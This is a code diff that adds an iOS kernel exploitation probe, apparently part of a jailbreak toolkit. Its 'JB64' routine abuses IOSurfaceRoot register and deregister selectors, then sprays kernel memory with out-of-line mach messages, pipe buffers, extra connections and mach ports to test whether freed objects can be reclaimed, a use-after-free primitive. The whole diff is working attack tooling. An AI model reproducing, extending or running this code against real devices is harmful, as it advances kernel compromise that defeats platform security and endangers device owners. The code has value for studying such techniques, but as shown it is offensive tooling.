@@ -44980,3 +44980,382 @@ void iosurface_kernel_ptrleak(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+static int jb64_regCapture(unsigned int conn, uint32_t sel, const uint64_t *in3,
+                            int shape, unsigned int wp,
+                            int(*sym_call)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*),
+                            int(*sym_async)(unsigned int, uint32_t, unsigned int, uint64_t*, uint32_t, const uint64_t*, uint32_t, const void*, size_t, void*, uint32_t*, uint64_t*, uint32_t*),
+                            uint64_t *outScalar, uint32_t *outScalarCnt,
+                            void *outStruct, size_t *outStructSz) {
+    uint64_t buf[3] = {0, 0, 0};
+    if (in3) { buf[0] = in3[0]; buf[1] = in3[1]; buf[2] = in3[2]; }
+    uint64_t ref = 0x1122334455667788ull;
+    uint32_t soc = 0;
+    if (shape == 0) {
+        return sym_call(conn, sel, NULL, 0, buf, 24, outScalar, outScalarCnt, outStruct, outStructSz);
+    }
+    return sym_async(conn, sel, wp, &ref, 1, NULL, 0, buf, 24, outStruct, &soc, outScalar, outScalarCnt);
+}
+
+void iosurface_ool_spray(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(0, 0), ^{
+        log(@"JB64: === Zone Reclaim via Output Buffer Capture ===");
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        results[@"probe"] = @"JB64";
+
+        typedef void*(*matching_fn)(const char*);
+        typedef unsigned int(*getmatch_fn)(unsigned int, void*);
+        typedef int(*svcopen_fn)(unsigned int, unsigned int, unsigned int, unsigned int*);
+        typedef int(*svcclose_fn)(unsigned int);
+        typedef int(*callmethod_fn)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*);
+        typedef int(*callasync_fn)(unsigned int, uint32_t, unsigned int, uint64_t*, uint32_t, const uint64_t*, uint32_t, const void*, size_t, void*, uint32_t*, uint64_t*, uint32_t*);
+        typedef int(*objrelease_fn)(unsigned int);
+        typedef void*(*cfcreate_fn)(void*);
+        typedef void(*cfrel_fn)(void*);
+
+        matching_fn sym_matching = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        getmatch_fn sym_getmatch = (getmatch_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+        svcopen_fn sym_open = (svcopen_fn)dlsym(RTLD_DEFAULT, "IOServiceOpen");
+        svcclose_fn sym_close = (svcclose_fn)dlsym(RTLD_DEFAULT, "IOServiceClose");
+        callmethod_fn sym_call = (callmethod_fn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+        callasync_fn sym_async = (callasync_fn)dlsym(RTLD_DEFAULT, "IOConnectCallAsyncMethod");
+        objrelease_fn sym_release = (objrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
+        cfcreate_fn sym_sc = (cfcreate_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        cfrel_fn sym_cfrelease = (cfrel_fn)dlsym(RTLD_DEFAULT, "CFRelease");
+
+        if (!sym_matching || !sym_getmatch || !sym_open || !sym_close || !sym_call || !sym_async) {
+            log(@"JB64: FAIL — dlsym missing");
+            results[@"verdict"] = @"DLSYM_FAIL";
+            done(results);
+            return;
+        }
+
+        const uint32_t SEL_REG = 17;
+        const uint32_t SEL_DEREG = 18;
+
+        void *surfMatch = sym_matching("IOSurfaceRoot");
+        unsigned int surfSvc = surfMatch ? sym_getmatch(0, surfMatch) : 0;
+        unsigned int conn = 0;
+        int openKr = surfSvc ? sym_open(surfSvc, mach_task_self(), 0, &conn) : -1;
+        if (surfSvc) sym_release(surfSvc);
+
+        NSDictionary *surfProps = @{
+            @"IOSurfaceAllocSize": @4096,
+            @"IOSurfaceWidth": @32,
+            @"IOSurfaceHeight": @32,
+            @"IOSurfaceBytesPerRow": @128,
+            @"IOSurfacePixelFormat": @0x42475241
+        };
+        void *surfObj = sym_sc ? sym_sc((__bridge void *)surfProps) : NULL;
+        unsigned int wp = jb41_newWakePort();
+
+        if (openKr != 0) {
+            log([NSString stringWithFormat:@"JB64: FAIL open kr=0x%x", openKr]);
+            results[@"verdict"] = @"OPEN_FAIL";
+            done(results);
+            return;
+        }
+
+        log([NSString stringWithFormat:@"JB64: conn=%u wp=%u surfObj=%p", conn, wp, surfObj]);
+
+        uint64_t in[3] = {0, 0, 0};
+
+        // BB1: Baseline — capture output buffers from sel17 async
+        log(@"JB64: --- BB1: Output buffer baseline (async vs sync) ---");
+        int bb1_diffs = 0;
+        {
+            for (int shape = 0; shape <= 1; shape++) {
+                uint64_t outS1[4] = {0};
+                uint32_t outS1Cnt = 4;
+                uint8_t outR1[64];
+                memset(outR1, 0xCC, 64);
+                size_t outR1Sz = 64;
+
+                int r1 = jb64_regCapture(conn, SEL_REG, in, shape, wp, sym_call, sym_async,
+                                          outS1, &outS1Cnt, outR1, &outR1Sz);
+
+                uint64_t outS2[4] = {0};
+                uint32_t outS2Cnt = 4;
+                uint8_t outR2[64];
+                memset(outR2, 0xDD, 64);
+                size_t outR2Sz = 64;
+
+                jb41_callSel(conn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                int r2 = jb64_regCapture(conn, SEL_REG, in, shape, wp, sym_call, sym_async,
+                                          outS2, &outS2Cnt, outR2, &outR2Sz);
+
+                jb41_callSel(conn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                int sdiff = (memcmp(outS1, outS2, sizeof(uint64_t) * 4) != 0) ? 1 : 0;
+                int rdiff = (memcmp(outR1, outR2, 64) != 0) ? 1 : 0;
+                if (sdiff || rdiff) bb1_diffs++;
+
+                log([NSString stringWithFormat:@"JB64: BB1 shape=%d r1=%d r2=%d sCnt1=%u sCnt2=%u rSz1=%zu rSz2=%zu sdiff=%d rdiff=%d",
+                     shape, r1, r2, outS1Cnt, outS2Cnt, outR1Sz, outR2Sz, sdiff, rdiff]);
+                log([NSString stringWithFormat:@"JB64: BB1 s1=[0x%llx 0x%llx 0x%llx 0x%llx]", outS1[0], outS1[1], outS1[2], outS1[3]]);
+                log([NSString stringWithFormat:@"JB64: BB1 s2=[0x%llx 0x%llx 0x%llx 0x%llx]", outS2[0], outS2[1], outS2[2], outS2[3]]);
+
+                NSMutableString *hex1 = [NSMutableString string];
+                NSMutableString *hex2 = [NSMutableString string];
+                for (int b = 0; b < 32 && b < (int)outR1Sz; b++) {
+                    [hex1 appendFormat:@"%02x", outR1[b]];
+                    [hex2 appendFormat:@"%02x", outR2[b]];
+                }
+                log([NSString stringWithFormat:@"JB64: BB1 r1=%@", hex1]);
+                log([NSString stringWithFormat:@"JB64: BB1 r2=%@", hex2]);
+            }
+        }
+        results[@"bb1_diffs"] = @(bb1_diffs);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // BB2: OOL mach message spray — spray 24-byte OOL then check output
+        log(@"JB64: --- BB2: OOL mach msg spray (24 bytes) ---");
+        int bb2_hit = 0;
+        {
+            for (int trial = 0; trial < 3; trial++) {
+                uint64_t outPre[4] = {0};
+                uint32_t outPreCnt = 4;
+                uint8_t outPreR[64];
+                memset(outPreR, 0, 64);
+                size_t outPreRSz = 64;
+
+                int r1 = jb64_regCapture(conn, SEL_REG, in, 1, wp, sym_call, sym_async,
+                                          outPre, &outPreCnt, outPreR, &outPreRSz);
+                jb41_callSel(conn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                unsigned int spray_port = 0;
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &spray_port);
+                mach_port_insert_right(mach_task_self(), spray_port, spray_port, MACH_MSG_TYPE_MAKE_SEND);
+
+                int sent = 0;
+                for (int m = 0; m < 128; m++) {
+                    uint8_t msgbuf[64];
+                    memset(msgbuf, 0, 64);
+                    uint8_t payload[24];
+                    memset(payload, 0x42 + trial, 24);
+                    uint32_t *h = (uint32_t *)msgbuf;
+                    h[0] = 0x80000013;
+                    h[1] = 44;
+                    h[2] = spray_port;
+                    h[3] = 0;
+                    h[4] = 0;
+                    h[5] = 0x6400 + m;
+                    h[6] = 1;
+                    void **addr_p = (void **)(msgbuf + 28);
+                    *addr_p = payload;
+                    msgbuf[36] = 0;
+                    msgbuf[37] = 1;
+                    msgbuf[38] = 0;
+                    msgbuf[39] = 1;
+                    uint32_t *szp = (uint32_t *)(msgbuf + 40);
+                    *szp = 24;
+                    int mr = mach_msg((mach_msg_header_t *)msgbuf, 1 | 0x10, 44, 0, 0, 100, 0);
+                    if (mr == 0) sent++;
+                }
+
+                uint64_t outPost[4] = {0};
+                uint32_t outPostCnt = 4;
+                uint8_t outPostR[64];
+                memset(outPostR, 0, 64);
+                size_t outPostRSz = 64;
+
+                int r2 = jb64_regCapture(conn, SEL_REG, in, 1, wp, sym_call, sym_async,
+                                          outPost, &outPostCnt, outPostR, &outPostRSz);
+                jb41_callSel(conn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                int sdiff = (memcmp(outPre, outPost, 32) != 0) ? 1 : 0;
+                int rdiff = (memcmp(outPreR, outPostR, 64) != 0) ? 1 : 0;
+                if (sdiff || rdiff) bb2_hit++;
+
+                log([NSString stringWithFormat:@"JB64: BB2 t%d sent=%d r1=%d r2=%d sdiff=%d rdiff=%d", trial, sent, r1, r2, sdiff, rdiff]);
+                if (sdiff) {
+                    log([NSString stringWithFormat:@"JB64: BB2 pre=[0x%llx 0x%llx] post=[0x%llx 0x%llx]",
+                         outPre[0], outPre[1], outPost[0], outPost[1]]);
+                }
+
+                mach_port_destroy(mach_task_self(), spray_port);
+            }
+        }
+        results[@"bb2_hit"] = @(bb2_hit);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // BB3: Cross-connection spray — register on 8 other connections after freeing
+        log(@"JB64: --- BB3: Cross-connection sel17 spray ---");
+        int bb3_hit = 0;
+        {
+            unsigned int conns[8] = {0};
+            int opened = 0;
+            for (int c = 0; c < 8; c++) {
+                void *m = sym_matching("IOSurfaceRoot");
+                unsigned int s = m ? sym_getmatch(0, m) : 0;
+                unsigned int cc = 0;
+                if (s && sym_open(s, mach_task_self(), 0, &cc) == 0) {
+                    conns[opened++] = cc;
+                }
+                if (s) sym_release(s);
+            }
+            log([NSString stringWithFormat:@"JB64: BB3 opened %d extra connections", opened]);
+
+            for (int trial = 0; trial < 3; trial++) {
+                uint64_t outPre[4] = {0};
+                uint32_t outPreCnt = 4;
+                uint8_t outPreR[64];
+                memset(outPreR, 0, 64);
+                size_t outPreRSz = 64;
+
+                jb64_regCapture(conn, SEL_REG, in, 1, wp, sym_call, sym_async,
+                                outPre, &outPreCnt, outPreR, &outPreRSz);
+                jb41_callSel(conn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                for (int c = 0; c < opened; c++) {
+                    jb41_callSel(conns[c], SEL_REG, in, 24, 1, wp, sym_call, sym_async);
+                }
+
+                uint64_t outPost[4] = {0};
+                uint32_t outPostCnt = 4;
+                uint8_t outPostR[64];
+                memset(outPostR, 0, 64);
+                size_t outPostRSz = 64;
+
+                int r2 = jb64_regCapture(conn, SEL_REG, in, 1, wp, sym_call, sym_async,
+                                          outPost, &outPostCnt, outPostR, &outPostRSz);
+
+                jb41_callSel(conn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+                for (int c = 0; c < opened; c++) {
+                    jb41_callSel(conns[c], SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+                }
+
+                int sdiff = (memcmp(outPre, outPost, 32) != 0) ? 1 : 0;
+                int rdiff = (memcmp(outPreR, outPostR, 64) != 0) ? 1 : 0;
+                if (sdiff || rdiff) bb3_hit++;
+
+                log([NSString stringWithFormat:@"JB64: BB3 t%d r2=%d sdiff=%d rdiff=%d", trial, r2, sdiff, rdiff]);
+                if (sdiff) {
+                    log([NSString stringWithFormat:@"JB64: BB3 pre=[0x%llx 0x%llx] post=[0x%llx 0x%llx]",
+                         outPre[0], outPre[1], outPost[0], outPost[1]]);
+                }
+            }
+
+            for (int c = 0; c < opened; c++) {
+                sym_close(conns[c]);
+            }
+        }
+        results[@"bb3_hit"] = @(bb3_hit);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // BB4: Pipe buffer spray
+        log(@"JB64: --- BB4: Pipe buffer spray ---");
+        int bb4_hit = 0;
+        {
+            for (int trial = 0; trial < 3; trial++) {
+                uint64_t outPre[4] = {0};
+                uint32_t outPreCnt = 4;
+
+                jb64_regCapture(conn, SEL_REG, in, 1, wp, sym_call, sym_async,
+                                outPre, &outPreCnt, NULL, NULL);
+                jb41_callSel(conn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                int pipes[64][2];
+                int created = 0;
+                uint8_t pdata[24];
+                memset(pdata, 0x50 + trial, 24);
+                for (int p = 0; p < 64; p++) {
+                    if (pipe(pipes[p]) == 0) {
+                        write(pipes[p][1], pdata, 24);
+                        created++;
+                    }
+                }
+
+                uint64_t outPost[4] = {0};
+                uint32_t outPostCnt = 4;
+
+                int r2 = jb64_regCapture(conn, SEL_REG, in, 1, wp, sym_call, sym_async,
+                                          outPost, &outPostCnt, NULL, NULL);
+                jb41_callSel(conn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                for (int p = 0; p < created; p++) {
+                    close(pipes[p][0]);
+                    close(pipes[p][1]);
+                }
+
+                int sdiff = (memcmp(outPre, outPost, 32) != 0) ? 1 : 0;
+                if (sdiff) bb4_hit++;
+
+                log([NSString stringWithFormat:@"JB64: BB4 t%d pipes=%d r2=%d sdiff=%d", trial, created, r2, sdiff]);
+                if (sdiff) {
+                    log([NSString stringWithFormat:@"JB64: BB4 pre=[0x%llx 0x%llx] post=[0x%llx 0x%llx]",
+                         outPre[0], outPre[1], outPost[0], outPost[1]]);
+                }
+            }
+        }
+        results[@"bb4_hit"] = @(bb4_hit);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // BB5: Mach port spray — allocate many receive rights
+        log(@"JB64: --- BB5: Mach port spray ---");
+        int bb5_hit = 0;
+        {
+            for (int trial = 0; trial < 3; trial++) {
+                uint64_t outPre[4] = {0};
+                uint32_t outPreCnt = 4;
+
+                jb64_regCapture(conn, SEL_REG, in, 1, wp, sym_call, sym_async,
+                                outPre, &outPreCnt, NULL, NULL);
+                jb41_callSel(conn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                unsigned int ports[128];
+                int allocated = 0;
+                for (int p = 0; p < 128; p++) {
+                    unsigned int port = 0;
+                    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port) == 0) {
+                        ports[allocated++] = port;
+                    }
+                }
+
+                uint64_t outPost[4] = {0};
+                uint32_t outPostCnt = 4;
+
+                int r2 = jb64_regCapture(conn, SEL_REG, in, 1, wp, sym_call, sym_async,
+                                          outPost, &outPostCnt, NULL, NULL);
+                jb41_callSel(conn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                for (int p = 0; p < allocated; p++) {
+                    mach_port_mod_refs(mach_task_self(), ports[p], MACH_PORT_RIGHT_RECEIVE, -1);
+                }
+
+                int sdiff = (memcmp(outPre, outPost, 32) != 0) ? 1 : 0;
+                if (sdiff) bb5_hit++;
+
+                log([NSString stringWithFormat:@"JB64: BB5 t%d ports=%d r2=%d sdiff=%d", trial, allocated, r2, sdiff]);
+                if (sdiff) {
+                    log([NSString stringWithFormat:@"JB64: BB5 pre=[0x%llx 0x%llx] post=[0x%llx 0x%llx]",
+                         outPre[0], outPre[1], outPost[0], outPost[1]]);
+                }
+            }
+        }
+        results[@"bb5_hit"] = @(bb5_hit);
+
+        if (surfObj && sym_cfrelease) sym_cfrelease(surfObj);
+        sym_close(conn);
+        jb41_dropPort(wp);
+
+        NSString *verdict = @"NO_RECLAIM";
+        if (bb1_diffs > 0) verdict = [NSString stringWithFormat:@"BASELINE_DIFF_%d", bb1_diffs];
+        if (bb2_hit > 0) verdict = [NSString stringWithFormat:@"OOL_HIT_%d", bb2_hit];
+        if (bb3_hit > 0) verdict = [NSString stringWithFormat:@"CROSS_CONN_HIT_%d", bb3_hit];
+        if (bb4_hit > 0) verdict = [NSString stringWithFormat:@"PIPE_HIT_%d", bb4_hit];
+        if (bb5_hit > 0) verdict = [NSString stringWithFormat:@"PORT_HIT_%d", bb5_hit];
+        if (bb2_hit + bb3_hit + bb4_hit + bb5_hit > 1) {
+            verdict = [NSString stringWithFormat:@"MULTI_HIT_ool%d_xconn%d_pipe%d_port%d", bb2_hit, bb3_hit, bb4_hit, bb5_hit];
+        }
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB64: Verdict: %@", verdict]);
+        isr_checkpoint(@"JB64-ool-spray-checkpoint.json", results);
+        done(results);
+    });
+}
